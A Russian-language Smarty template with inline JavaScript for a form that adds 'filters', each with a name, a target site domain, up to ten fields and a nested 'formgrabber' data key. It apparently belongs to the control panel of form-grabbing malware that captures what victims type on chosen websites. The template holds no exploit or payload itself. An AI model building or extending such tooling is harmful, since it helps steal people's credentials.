{if $save eq ''}
<form name="add_filter" action="" enctype="application/x-www-form-urlencoded" method="post">
<h2>Добавления фильтра {if $parent}<span style="font-size:14px;">(в раздел {$parent->name})</span>{/if}</h2>
{if $errors ne ""}
<div align="center">
{$errors}
</div>
<br />
{/if}

<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp2">
    <th style="text-align: left; width: 250px;">Название</th>
    <th style="text-align: left;"><input name="name" type="text" value="{$smarty.post.name}" class="user" /></th>
</tr>
<tr class="bgp1">
  <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 250px;">Сайт (домен)</th>
    <th style="text-align: left;"><input name="host" type="text" value="{$smarty.post.host}" class="user" /></th>
</tr>
<tr class="bgp1">
  <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 250px;">Количество полей</th>
    <th style="text-align: left;">
    <select name="fields" class="user" onchange="create_data_filter_null(this.value, 'add_html');">
    <option value="0">Выберите количество</option>
    <option value="1"{if $smarty.post.fields eq 1} selected="selected"{/if}>1 поле</option>
    <option value="2"{if $smarty.post.fields eq 2} selected="selected"{/if}>2 поля</option>
    <option value="3"{if $smarty.post.fields eq 3} selected="selected"{/if}>3 поля</option>
    <option value="4"{if $smarty.post.fields eq 4} selected="selected"{/if}>4 поля</option>
    <option value="5"{if $smarty.post.fields eq 5} selected="selected"{/if}>5 полей</option>
    <option value="6"{if $smarty.post.fields eq 6} selected="selected"{/if}>6 полей</option>
    <option value="7"{if $smarty.post.fields eq 7} selected="selected"{/if}>7 полей</option>
    <option value="8"{if $smarty.post.fields eq 8} selected="selected"{/if}>8 полей</option>
    <option value="9"{if $smarty.post.fields eq 9} selected="selected"{/if}>9 полей</option>
    <option value="10"{if $smarty.post.fields eq 10} selected="selected"{/if}>10 полей</option>
    </select>
    </th>
</tr>
<tr class="bgp1">
  <th height="25" colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
  <th colspan="2" id="add_html"><center>Параметров фильтра еще нет, сделайте выбор колличества полей!</center></th>
</tr>
<tr class="bgp1">
  <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th colspan="2"><input name="submit" type="submit" value="Добавить" style="width: 100%" /></th>
</tr>
</table>
</form>
<script language="javascript" type="application/javascript">
var all_filter_item = 0;
function create_data_filter_null(z, add_html){ldelim}
	if (all_filter_item != 0){ldelim}
		if(confirm('Все текущие данные, заполненные в полях исчезнут! Продолжить?') == false){ldelim}
			document.forms['add_filter'].elements['fields'].selectedIndex = i-1;
			return;
		{rdelim}
	{rdelim}
	all_filter_item = z;
	create_data_filter(z, add_html);
{rdelim}
create_data_filter('{$smarty.post.fields}', 'add_html');
var p=new Array();
{foreach from=$smarty.post.p item=item key=key}
p['{$key}'] = new Array();
{foreach from=$item item=i key=k}
{if $key eq 'formgrabber'}
p['{$key}']['{$k}'] = new Array();
{foreach from=$i item=ie key=ke}
p['{$key}']['{$k}']['{$ke}'] = '{$ie}';
{/foreach}
{else}
p['{$key}']['{$k}'] = '{$i}';
{/if}
{/foreach}
{/foreach}
set_data_filter(p, 'p', 'add_filter');
</script>
{else}
<center>
  <h2>Новый фильтр добавлен!</h2></center>
{if $parent}
<center>
  <span style="font-size:14px;">Фильтр добавлен в {$parent->name}.</span>
</center>
{/if}
<br />
<center><a href="/catalog/">Перейти в каталог фильтров</a></center>
{/if}